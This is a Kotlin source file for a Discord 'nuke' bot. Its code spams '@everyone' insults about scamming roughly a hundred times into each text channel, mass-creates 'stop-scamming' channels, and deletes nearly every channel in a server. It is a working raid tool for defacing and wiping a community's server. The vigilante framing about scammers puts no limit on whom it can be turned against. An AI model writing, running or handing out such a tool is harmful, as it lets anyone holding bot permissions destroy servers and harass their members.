package me.trolman.nuke

import kotlin.concurrent.thread

open class Nuker {
    companion object {
        private fun spamTextChannel(id: String) {
            val channel = Bot.getJda().getTextChannelById(id) ?: return

            thread {
                for (i in 0..100) {
                    channel.sendMessage("@everyone fuck you and stop scamming :3").queue()
                    Thread.sleep(50)
                }
            }
        }

        fun spamAllChannels() {
            for (channel in Bot.getJda().textChannels) {
                spamTextChannel(channel.id)
            }
        }
        fun createChannel(name: String, guild: String) {
            Bot.getJda().getGuildById(guild)!!.createTextChannel(name)
                .queue()
        }

        fun createChannels(guild: String) {
            val BASE_NAME = "stop-scamming-"

            thread {
                for (i in 1..20) {
                    createChannel(BASE_NAME + i, guild)
                    Thread.sleep(50)
                }
            }
        }

        fun deleteChannelExceptOne(guild: String) {
            val channels: Int = Bot.getJda().getGuildById(guild)!!.channels.size
            for (i in 1..channels - 1) {
                deleteChannel(Bot.getJda().textChannels[i].id, guild)
            }
        }
        private fun deleteChannel(id: String, guild: String) {
            Bot.getJda().getGuildById(guild)!!.getTextChannelById(id)!!.delete().queue()
        }



    }
}